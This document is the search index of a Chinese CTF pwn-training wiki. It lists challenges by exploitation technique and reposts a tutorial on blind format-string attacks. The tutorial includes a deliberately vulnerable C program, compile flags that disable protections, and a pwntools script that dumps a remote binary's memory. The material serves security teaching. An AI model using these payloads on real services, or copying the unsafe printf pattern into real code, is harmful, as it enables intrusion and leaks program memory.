{"config":{"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"\u5173\u4e8ewiki ___________ _____.___. __ __.__ ____ __.__ / _____/ | _\\__ | | ____ / \\ / \\__| |/ _|__| \\_____ \\| |/ // | |/ __ \\ \\ \\/\\/ / | < | | / \\ < \\____ \\ ___/ \\ /| | | \\| | /_______ /__|_ \\/ ______|\\___ > \\__/\\ / |__|____|__ \\__| \\/ \\/\\/ \\/ \\/ \\/ Site Blog: SkYe's Blog WiKi: SkYe's WiKi Github: @skyedai910 CSDN: @SkYe231 Chart Email:skye437231@gmail.com","title":"Home"},{"location":"#wiki","text":"___________ _____.___. __ __.__ ____ __.__ / _____/ | _\\__ | | ____ / \\ / \\__| |/ _|__| \\_____ \\| |/ // | |/ __ \\ \\ \\/\\/ / | < | | / \\ < \\____ \\ ___/ \\ /| | | \\| | /_______ /__|_ \\/ ______|\\___ > \\__/\\ / |__|____|__ \\__| \\/ \\/\\/ \\/ \\/ \\/","title":"\u5173\u4e8ewiki"},{"location":"#site","text":"Blog: SkYe's Blog WiKi: SkYe's WiKi Github: @skyedai910 CSDN: @SkYe231","title":"Site"},{"location":"#chart","text":"Email:skye437231@gmail.com","title":"Chart"},{"location":"about/","text":"___________ _____.___. __ __.__ ____ __.__ / _____/ | _\\__ | | ____ / \\ / \\__| |/ _|__| \\_____ \\| |/ // | |/ __ \\ \\ \\/\\/ / | < | | / \\ < \\____ \\ ___/ \\ /| | | \\| | /_______ /__|_ \\/ ______|\\___ > \\__/\\ / |__|____|__ \\__| \\/ \\/\\/ \\/ \\/ \\/ \u6e23\u6e23\u81ea\u8ff0 \u5e7f\u5dde\u8fa3\u9e21\u4e8c\u672c\u7684\u5927\u4e8c\u751f\uff0c\u8bf7\u5404\u4f4d\u5927\u4f6c\u591a\u591a\u6307\u6559\u3002 Blog\u5199\u4e86\u4ec0\u4e48\u5c31\u53d1\u4ec0\u4e48\uff0c\u5185\u5bb9\u6e23\u4e14\u6742\u3002\u77e5\u8bc6\u6574\u7406\u5728 WiKi \u3002 \u95e8\u6237\u7f51\u7ad9 Blog: SkYe's Blog WiKi: SkYe's WiKi Github: @skyedai910 CSDN: @SkYe231 \u8054\u7cfb\u65b9\u5f0f Email:skye437231@gmail.com","title":"About"},{"location":"about/#_1","text":"\u5e7f\u5dde\u8fa3\u9e21\u4e8c\u672c\u7684\u5927\u4e8c\u751f\uff0c\u8bf7\u5404\u4f4d\u5927\u4f6c\u591a\u591a\u6307\u6559\u3002 Blog\u5199\u4e86\u4ec0\u4e48\u5c31\u53d1\u4ec0\u4e48\uff0c\u5185\u5bb9\u6e23\u4e14\u6742\u3002\u77e5\u8bc6\u6574\u7406\u5728 WiKi \u3002","title":"\u6e23\u6e23\u81ea\u8ff0"},{"location":"about/#_2","text":"Blog: SkYe's Blog WiKi: SkYe's WiKi Github: @skyedai910 CSDN: @SkYe231","title":"\u95e8\u6237\u7f51\u7ad9"},{"location":"about/#_3","text":"Email:skye437231@gmail.com","title":"\u8054\u7cfb\u65b9\u5f0f"},{"location":"KnowExam/Know%26Exam/","text":"\u77e5\u8bc6\u70b9&\u9898\u76ee\u7d22\u5f15 \u6574\u6570\u6ea2\u51fa bjdctf_2020_babystack2 \u8003 \u70b9\uff1a\u6574\u6570\u6ea2\u51fa \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU pwn2_sctf_2016 \u8003 \u70b9\uff1a\u6574\u6570\u6ea2\u51fa\u3001ROP \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU ROP\uff08\u6808\u6ea2\u51fa\uff09 jarvisoj_level3 jarvisoj_tell_me_something jarvisoj_level4 bjdctf_2020_babyrop jarvisoj_test_your_memory PicoCTF_2018_rop_chain \u8003 \u70b9\uff1a\u7b80\u5355ROP \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU ez_pz_hackover_2016 \u8003 \u70b9\uff1a\u7b80\u5355ROP\u3001strcmp \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u94c1\u4eba\u4e09\u9879(\u7b2c\u4e94\u8d5b\u533a)_2018_rop jarvisoj_level1 \u8003 \u70b9\uff1a\u7b80\u5355ROP\u3001write \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU bjdctf_2020_babyrop2 \u8003 \u70b9\uff1aret2libc\u3001\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7ed5\u8fc7canary \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU jarvisoj_level3_x64 \u8003 \u70b9\uff1aret2csu\u3001write \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU pwnable.tw-3x17 DASCTF\u4e94\u6708\u8d5b-Memory Monster II \u8003 \u70b9\uff1a64\u4f4d\u52ab\u6301 fini_array\u8fdb\u884cROP \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1apwnable.tw\u3001github \u6808\u8fc1\u79fb gyctf_2020_borrowstack \u8003 \u70b9\uff1a\u6808\u8fc1\u79fb\u3001onegedget \u505a\u9898\u7b14\u8bb0\uff1ahttps://www.mrskye.cn/archives/14/ \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a\u6d4b\u8bd5\u4e0d\u80fd\u4f7f\u7528system('/bin/sh')\uff0c\u7a7a\u95f4\u4e0d\u8db3\uff0c\u8be6\u7ec6\u770bwp [Black Watch \u5165\u7fa4\u9898]PWN-spwn \u8003 \u70b9\uff1a\u6808\u8fc1\u79fb \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a\u8fd9\u6761\u9898\u76ee\u6ce8\u610f puts \u548c write \u6240\u9700\u6808\u7a7a\u95f4\u7684\u5927\u5c0f\u4e0e\u5199\u5165 bss \u7684\u4f4d\u7f6e\u5173\u7cfb ciscn_2019_es_2 \u8003 \u70b9\uff1a\u7b80\u5355\u6808\u8fc1\u79fb \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a\u6ce8\u610f /bin/sh \u5199\u5165\u4f4d\u7f6e\u4e0e\u6808\u751f\u957f\u65b9\u5411 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32 jarvisoj_fm \u8003 \u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001\u4efb\u610f\u5730\u5740\u5c0f\u6570\u5b57\u8986\u76d6 \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a\u53ef\u4ee5\u601d\u8003\u4e00\u4e0b\u5982\u679c\u8981\u6c42\u8986\u76d6\u7684\u662f 1 \u600e\u4e48\u6784\u9020 [RACTF]Finches in a Stack \u8003 \u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001\u7ed5\u8fc7 canary \u505a\u9898\u7b14\u8bb0\uff1ahttps://www.mrskye.cn/archives/138/#FinchesinaStack \u5b9e\u9a8c\u73af\u5883\uff1a \u5907 \u6ce8\uff1a\u539f\u9898\u4e3a Ubuntu18\uff0c\u6709\u540e\u95e8 [RACTF]Finches in a Pie \u8003 \u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001\u7ed5\u8fc7 canary \u3001PIE \u505a\u9898\u7b14\u8bb0\uff1ahttps://www.mrskye.cn/archives/138/#FinchesinaStack \u5b9e\u9a8c\u73af\u5883\uff1a \u5907 \u6ce8\uff1a\u539f\u9898\u4e3a Ubuntu18\uff0c\u6709\u540e\u95e8 [BJDCTF 2nd]r2t4 \u8003 \u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001__stack_chk_fail \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a\u4e0e\u6b63\u5e38\u7ed5\u8fc7 canary \u4e0d\u540c\u7684\u662f\uff0c\u6545\u610f\u89e6\u53d1\u62a5\u9519\uff1b\u7559\u6709\u540e\u95e8\uff0c\u96be\u5ea6\u4f4e\u4e8e redpwn2020 dead-canary redpwn2020 dead-canary \u8003 \u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001__stack_chk_fail \u505a\u9898\u7b14\u8bb0\uff1a redpwnCTF 2020 pwn\u90e8\u5206writeup \u5b9e\u9a8c\u73af\u5883\uff1a github \u5907 \u6ce8\uff1a\u4e0e[BJDCTF 2nd]r2t4\u4e00\u6837\u4e3b\u52a8\u89e6\u53d1 canary \uff0c\u6ca1\u6709\u7559\u540e\u95e8\uff0c\u9700\u8981\u81ea\u5df1\u6784\u5efa ROP \u94fe\uff08\u5982\u679c\u7528onegadget\u4e0d\u9700\u8981 ROP\uff09 \u9759\u6001\u7f16\u8bd1 cmcc_simplerop \u8003 \u70b9\uff1a\u7cfb\u7edf\u8c03\u7528\u53f7\u3001\u7b80\u5355\u6808\u6ea2\u51fa \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU get_started_3dsctf_2016 \u8003 \u70b9\uff1amprotect\u6539\u5185\u5b58\u6743\u9650\u3001\u7b80\u5355\u6808\u6ea2\u51fa \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a\u672c\u5730\u53ef\u53ea\u7528\u6808\u6ea2\u51fa\u3001\u8fdc\u7a0b\u9700\u8981\u914d\u5408mprotect 2017 \u6e56\u6e58\u676f pwn300 \u9a9a\u4e1c\u897f pwnable_orw \u8003 \u70b9\uff1aseccomp\u6c99\u7bb1\u3001shellcode \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU bjdctf_2020_router \u8003 \u70b9\uff1alinux \u591a\u6307\u4ee4\u6267\u884c \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU jarvisoj_level1 \u8003 \u70b9\uff1alinux \u591a\u6307\u4ee4\u6267\u884c \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a\u672c\u5730\u53ef\u53ea\u5199shellcode\u3001\u8fdc\u7a0b\u9700\u8981ret2libc","title":"\u77e5\u8bc6\u70b9&\u9898\u76ee\u7d22\u5f15"},{"location":"KnowExam/Know%26Exam/#_1","text":"","title":"\u77e5\u8bc6\u70b9&amp;\u9898\u76ee\u7d22\u5f15"},{"location":"KnowExam/Know%26Exam/#_2","text":"bjdctf_2020_babystack2 \u8003 \u70b9\uff1a\u6574\u6570\u6ea2\u51fa \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU pwn2_sctf_2016 \u8003 \u70b9\uff1a\u6574\u6570\u6ea2\u51fa\u3001ROP \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU","title":"\u6574\u6570\u6ea2\u51fa"},{"location":"KnowExam/Know%26Exam/#rop","text":"jarvisoj_level3 jarvisoj_tell_me_something jarvisoj_level4 bjdctf_2020_babyrop jarvisoj_test_your_memory PicoCTF_2018_rop_chain \u8003 \u70b9\uff1a\u7b80\u5355ROP \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU ez_pz_hackover_2016 \u8003 \u70b9\uff1a\u7b80\u5355ROP\u3001strcmp \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u94c1\u4eba\u4e09\u9879(\u7b2c\u4e94\u8d5b\u533a)_2018_rop jarvisoj_level1 \u8003 \u70b9\uff1a\u7b80\u5355ROP\u3001write \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU bjdctf_2020_babyrop2 \u8003 \u70b9\uff1aret2libc\u3001\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7ed5\u8fc7canary \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU jarvisoj_level3_x64 \u8003 \u70b9\uff1aret2csu\u3001write \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU pwnable.tw-3x17 DASCTF\u4e94\u6708\u8d5b-Memory Monster II \u8003 \u70b9\uff1a64\u4f4d\u52ab\u6301 fini_array\u8fdb\u884cROP \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1apwnable.tw\u3001github","title":"ROP\uff08\u6808\u6ea2\u51fa\uff09"},{"location":"KnowExam/Know%26Exam/#_3","text":"gyctf_2020_borrowstack \u8003 \u70b9\uff1a\u6808\u8fc1\u79fb\u3001onegedget \u505a\u9898\u7b14\u8bb0\uff1ahttps://www.mrskye.cn/archives/14/ \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a\u6d4b\u8bd5\u4e0d\u80fd\u4f7f\u7528system('/bin/sh')\uff0c\u7a7a\u95f4\u4e0d\u8db3\uff0c\u8be6\u7ec6\u770bwp [Black Watch \u5165\u7fa4\u9898]PWN-spwn \u8003 \u70b9\uff1a\u6808\u8fc1\u79fb \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a\u8fd9\u6761\u9898\u76ee\u6ce8\u610f puts \u548c write \u6240\u9700\u6808\u7a7a\u95f4\u7684\u5927\u5c0f\u4e0e\u5199\u5165 bss \u7684\u4f4d\u7f6e\u5173\u7cfb ciscn_2019_es_2 \u8003 \u70b9\uff1a\u7b80\u5355\u6808\u8fc1\u79fb \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a\u6ce8\u610f /bin/sh \u5199\u5165\u4f4d\u7f6e\u4e0e\u6808\u751f\u957f\u65b9\u5411","title":"\u6808\u8fc1\u79fb"},{"location":"KnowExam/Know%26Exam/#_4","text":"jarvisoj_fm \u8003 \u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001\u4efb\u610f\u5730\u5740\u5c0f\u6570\u5b57\u8986\u76d6 \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a\u53ef\u4ee5\u601d\u8003\u4e00\u4e0b\u5982\u679c\u8981\u6c42\u8986\u76d6\u7684\u662f 1 \u600e\u4e48\u6784\u9020 [RACTF]Finches in a Stack \u8003 \u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001\u7ed5\u8fc7 canary \u505a\u9898\u7b14\u8bb0\uff1ahttps://www.mrskye.cn/archives/138/#FinchesinaStack \u5b9e\u9a8c\u73af\u5883\uff1a \u5907 \u6ce8\uff1a\u539f\u9898\u4e3a Ubuntu18\uff0c\u6709\u540e\u95e8 [RACTF]Finches in a Pie \u8003 \u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001\u7ed5\u8fc7 canary \u3001PIE \u505a\u9898\u7b14\u8bb0\uff1ahttps://www.mrskye.cn/archives/138/#FinchesinaStack \u5b9e\u9a8c\u73af\u5883\uff1a \u5907 \u6ce8\uff1a\u539f\u9898\u4e3a Ubuntu18\uff0c\u6709\u540e\u95e8 [BJDCTF 2nd]r2t4 \u8003 \u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001__stack_chk_fail \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a\u4e0e\u6b63\u5e38\u7ed5\u8fc7 canary \u4e0d\u540c\u7684\u662f\uff0c\u6545\u610f\u89e6\u53d1\u62a5\u9519\uff1b\u7559\u6709\u540e\u95e8\uff0c\u96be\u5ea6\u4f4e\u4e8e redpwn2020 dead-canary redpwn2020 dead-canary \u8003 \u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001__stack_chk_fail \u505a\u9898\u7b14\u8bb0\uff1a redpwnCTF 2020 pwn\u90e8\u5206writeup \u5b9e\u9a8c\u73af\u5883\uff1a github \u5907 \u6ce8\uff1a\u4e0e[BJDCTF 2nd]r2t4\u4e00\u6837\u4e3b\u52a8\u89e6\u53d1 canary \uff0c\u6ca1\u6709\u7559\u540e\u95e8\uff0c\u9700\u8981\u81ea\u5df1\u6784\u5efa ROP \u94fe\uff08\u5982\u679c\u7528onegadget\u4e0d\u9700\u8981 ROP\uff09","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32"},{"location":"KnowExam/Know%26Exam/#_5","text":"cmcc_simplerop \u8003 \u70b9\uff1a\u7cfb\u7edf\u8c03\u7528\u53f7\u3001\u7b80\u5355\u6808\u6ea2\u51fa \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU get_started_3dsctf_2016 \u8003 \u70b9\uff1amprotect\u6539\u5185\u5b58\u6743\u9650\u3001\u7b80\u5355\u6808\u6ea2\u51fa \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a\u672c\u5730\u53ef\u53ea\u7528\u6808\u6ea2\u51fa\u3001\u8fdc\u7a0b\u9700\u8981\u914d\u5408mprotect 2017 \u6e56\u6e58\u676f pwn300","title":"\u9759\u6001\u7f16\u8bd1"},{"location":"KnowExam/Know%26Exam/#_6","text":"pwnable_orw \u8003 \u70b9\uff1aseccomp\u6c99\u7bb1\u3001shellcode \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU bjdctf_2020_router \u8003 \u70b9\uff1alinux \u591a\u6307\u4ee4\u6267\u884c \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU jarvisoj_level1 \u8003 \u70b9\uff1alinux \u591a\u6307\u4ee4\u6267\u884c \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a\u672c\u5730\u53ef\u53ea\u5199shellcode\u3001\u8fdc\u7a0b\u9700\u8981ret2libc","title":"\u9a9a\u4e1c\u897f"},{"location":"fmtstr/Bilnd_Pwn/","text":"\u3010\u8f6c\u3011Bilnd-\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253 \u6587\u7ae0\u9996\u53d1\u4e8e \u5408\u5929\u4f17\u667a \uff0c\u8f6c\u8f7d\u5230\u535a\u5ba2\u4ec5\u4f5c\u5907\u4efd \u53ef\u80fd\u9700\u8981\u63d0\u524d\u4e86\u89e3\u7684\u77e5\u8bc6 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u539f\u7406&\u5229\u7528 got & plt \u8c03\u7528\u5173\u7cfb \u7a0b\u5e8f\u7684\u4e00\u822c\u542f\u52a8\u8fc7\u7a0b \u539f\u7406 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253\u6307\u7684\u662f\u53ea\u7ed9\u51fa\u53ef\u4ea4\u4e92\u7684 ip \u5730\u5740\u4e0e\u7aef\u53e3\uff0c\u4e0d\u7ed9\u51fa\u5bf9\u5e94\u7684 binary \u6587\u4ef6\u6765\u8ba9\u6211\u4eec\u65e0\u6cd5\u901a\u8fc7 IDA \u5206\u6790\uff0c\u5176\u5b9e\u8fd9\u4e2a\u548c BROP \u5dee\u4e0d\u591a\uff0c\u4e0d\u8fc7 BROP \u5229\u7528\u7684\u662f\u6808\u6ea2\u51fa\uff0c\u800c\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u7684\u662f\u65e0\u9650\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u628a\u5728\u5185\u5b58\u4e2d\u7684\u7a0b\u5e8f\u7ed9 dump \u4e0b\u6765\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u6309\u7167\u5982\u4e0b\u6b65\u9aa4\u8fdb\u884c \u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570\uff08\u4e0d\u540c\u4f4d\u6570\u6709\u4e9b\u8bb8\u5dee\u522b\uff09 \u786e\u5b9a\u6f0f\u6d1e\u4f4d\u7f6e \u5229\u7528 \u4f7f\u7528\u6761\u4ef6 \u53ef\u4ee5\u8bfb\u5165 '\\x00' \u5b57\u7b26\u7684 \u8f93\u51fa\u51fd\u6570\u5747\u662f '\\x00' \u622a\u65ad\u7684 \u80fd\u65e0\u9650\u4f7f\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e 32 \u4f4d\u5229\u7528\u624b\u6cd5 \u5b9e\u9a8c\u73af\u5883\u51c6\u5907 \u7a0b\u5e8f\u6e90\u7801\u5982\u4e0b\uff1a #include <stdio.h> #include <string.h> #include <unistd.h> int main(int argc, char *argv[]) { setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL); int flag; char buf[1024]; FILE* f; puts(\"What's your name?\"); fgets(buf, 1024, stdin); printf(\"Hi, \"); printf(\"%s\",buf); putchar('\\n'); flag = 1; while (flag == 1){ puts(\"Do you want the flag?\"); memset(buf,'\\0',1024); read(STDIN_FILENO, buf, 100); if (!strcmp(buf, \"no\\n\")){ printf(\"I see. Good bye.\"); return 0; }else { printf(\"Your input isn't right:\"); printf(buf); printf(\"Please Try again!\\n\"); } fflush(stdout); } return 0; } \u7f16\u8bd1 32 \u4f4d\u6587\u4ef6\uff1a gcc -z execstack -fno-stack-protector -m32 -o leakmemory leakmemory.c \u7528 socat \u6302\u5230\u7aef\u53e3 10001 \u4e0a\u90e8\u7f72\uff1a socat TCP4-LISTEN:10001,fork EXEC:./leakmemory \u5b9e\u9a8c\u73af\u5883\u5b8c\u6210\uff0c\u5982\u679c\u662f\u672c\u5730\u90e8\u7f72\u7684\u8bdd\uff0c\u7b49\u7b49\u5728 exp \u91cc\u9762\u5199 remote(\"127.0.0.1\",10001) \u6a21\u62df\u6ca1\u6709 binary \u7684\u8fdc\u7a0b\u76f2\u6253\u60c5\u51b5\u3002 \u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570 \u7528 %p \u770b\u770b\u7a0b\u5e8f\u56de\u663e\u8f93\u51fa\u7684\u957f\u5ea6\u662f\u591a\u5c11\uff0c\u4ee5\u6b64\u5224\u65ad\u7a0b\u5e8f\u7684\u4f4d\u6570\u3002\u8fd9\u91cc\u770b\u5230\u56de\u663e\u662f 4 \u4e2a\u5b57\u8282\uff0c\u5224\u65ad\u662f 32 \u4f4d\u7a0b\u5e8f\u3002\u53ef\u4ee5\u518d\u591a\u6cc4\u9732\u51e0\u4e2a\uff0c\u90fd\u662f 4 \u5b57\u8282\uff08\u542b\uff09\u4ee5\u4e0b\u7684\uff0c\u786e\u5b9a\u4e3a 32 \u4f4d\u7a0b\u5e8f\u3002 \u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u504f\u79fb \u627e\u5230\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u662f\u591a\u5c11\uff0c\u5728\u540e\u7eed\u64cd\u4f5c\u4e2d\u4f1a\u7528\u5230\u3002\u7531\u4e8e\u6ca1\u6709 binary \u4e0d\u80fd\u901a\u8fc7\u8c03\u8bd5\u5206\u6790\u504f\u79fb\uff0c\u5c31\u91c7\u53d6\u8f93\u5165\u591a\u4e2a %p \u6cc4\u9732\u51fa\u504f\u79fb\u3002\u4e3a\u4e86\u5bb9\u6613\u8fa8\u8ba4\uff0c\u5b57\u7b26\u4e32\u5f00\u59cb\u5148\u586b\u5145 4 \u5b57\u8282 \u7684\u586b\u5145\uff0864\u4f4d8\u5b57\u8282\uff09\uff0c\u7136\u540e\u518d\u586b\u5165 %p \u3002 \u6700\u540e\u786e\u8ba4\u504f\u79fb\u4e3a 7 \u3002 dump \u7a0b\u5e8f dump \u7a0b\u5e8f\u5e94\u8be5\u9009\u54ea\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff1a %n$s \uff1a\u5c06\u7b2c n \u4e2a\u53c2\u6570\u7684\u503c\u4f5c\u4e3a\u5730\u5740\uff0c\u8f93\u51fa\u8fd9\u4e2a\u5730\u5740\u6307\u5411\u7684\u5b57\u7b26\u4e32\u5185\u5bb9 %n$p \uff1a\u5c06\u7b2c n \u4e2a\u53c2\u6570\u7684\u503c\u4f5c\u4e3a\u5185\u5bb9\uff0c\u4ee5\u5341\u516d\u8fdb\u5236\u5f62\u5f0f\u8f93\u51fa \u6211\u4eec\u662f\u9700\u8981 dump \u7a0b\u5e8f\uff0c\u4e5f\u5c31\u662f\u60f3\u83b7\u53d6\u6211\u4eec\u6240\u7ed9\u5b9a\u5730\u5740\u7684\u5185\u5bb9\uff0c\u800c\u4e0d\u662f\u83b7\u53d6\u6211\u4eec\u7ed9\u5b9a\u7684\u5730\u5740\u3002\u6240\u4ee5\u5e94\u8be5\u7528 %n$s \u628a\u6211\u4eec\u7ed9\u5b9a\u5730\u5740\u5f53\u4f5c\u6307\u9488\uff0c\u8f93\u51fa\u7ed9\u5b9a\u5730\u5740\u6240\u6307\u5411\u7684\u5b57\u7b26\u4e32\u3002\u7ed3\u5408\u524d\u9762\u77e5\u9053\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u504f\u79fb\u4e3a 7 \uff0cpayload \u5e94\u8be5\u4e3a\uff1a %9$s.TMP[addr] \u3002 \u6ce8\u610f \uff1a\u4f7f\u7528 %s \u8fdb\u884c\u8f93\u51fa\u5e76\u4e0d\u662f\u4e00\u4e2a\u5b57\u8282\u4e00\u4e2a\u5b57\u8282\u8f93\u51fa\uff0c\u800c\u662f\u4e00\u76f4\u8f93\u51fa\u76f4\u5230\u9047\u5230 \\x00 \u622a\u6b62\u7b26\u624d\u4f1a\u505c\u6b62\uff0c\u4e5f\u5c31\u662f\u6bcf\u6b21\u6cc4\u9732\u7684\u957f\u5ea6\u662f\u4e0d\u786e\u5b9a\u7684\uff0c\u53ef\u80fd\u5f88\u957f\u4e5f\u53ef\u80fd\u662f\u7a7a\u3002\u56e0\u4e3a .text \u6bb5\u5f88\u53ef\u80fd\u6709\u8fde\u7eed \\x00 \uff0c\u6240\u4ee5\u6cc4\u9732\u811a\u672c\u5904\u7406\u60c5\u51b5\u6709\uff1a \u9488\u5bf9\u6bcf\u6b21\u6cc4\u9732\u957f\u5ea6\u4e0d\u7b49\uff0caddr \u6839\u636e\u6bcf\u6b21\u6cc4\u9732\u957f\u5ea6\u52a8\u6001\u589e\u52a0\uff1b \u6cc4\u9732\u5b57\u7b26\u4e32\u53ef\u80fd\u4e3a\u7a7a\uff0c\u4e5f\u5c31\u662f\u5982\u4f55\u5904\u7406 \\x00 \uff1b \u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u6709\u4e00\u4e2a\u95ee\u9898\u662f\u6cc4\u9732\u7684\u8d77\u59cb\u5730\u5740\u5728\u54ea\u91cc\uff1f\u4ece\u5404\u4e2a\u5927\u4f6c\u6587\u7ae0\u5b66\u5230\u4e24\u79cd\u505a\u6cd5\uff1a\u4ece .text \u6bb5\u5f00\u59cb\uff1b\u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb\uff1b\u4e24\u79cd\u65b9\u6cd5\u6cc4\u9732\u51fa\u6765\u7a0b\u5e8f\uff0c\u5728 ida \u4e2d\u5448\u73b0\u6709\u5dee\u522b\u3002 \u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb \u5148\u6765\u8bf4\u7701\u4e8b\u7684\uff0c \u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb \u3002\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9 32 \u4f4d\u548c 64 \u4f4d\u5404\u4e0d\u76f8\u540c\uff1a 32 \u4f4d\uff1a\u4ece 0x8048000 \u5f00\u59cb\u6cc4\u9732 64 \u4f4d\uff1a\u4ece 0x400000 \u5f00\u59cb\u6cc4\u9732 \u4e0b\u9762\u662f\u8fd9\u6761\u4f8b\u9898\u7684\u6cc4\u9732\u811a\u672c\uff0c\u7ed3\u5408\u6ce8\u89e3\u5206\u6790\u5982\u4f55\u5904\u7406\u4e0a\u9762\u63d0\u5230\u7684\u95ee\u9898\uff1a #! /usr/bin/env python # -*- coding: utf-8 -*- from pwn import * import binascii r = remote('127.0.0.1',10001) def leak(addr): payload = \"%9$s.TMP\" + p32(addr) r.sendline(payload) print \"leaking:\", hex(addr) r.recvuntil('right:') ret = r.recvuntil(\".TMP\",drop=True) print \"ret:\", binascii.hexlify(ret), len(ret) remain = r.recvrepeat(0.2) return ret # name r.recv() r.sendline('nameaaa') r.recv() # leak begin = 0x8048000 text_seg ='' try: while True: ret = leak(begin) text_seg += ret begin += len(ret) if len(ret) == 0: # nil begin +=1 text_seg += '\\x00' except Exception as e: print e finally: print '[+]',len(text_seg) with open('dump_bin','wb') as f: f.write(text_seg) \u6ce8\u89e3 \uff1a 19-21 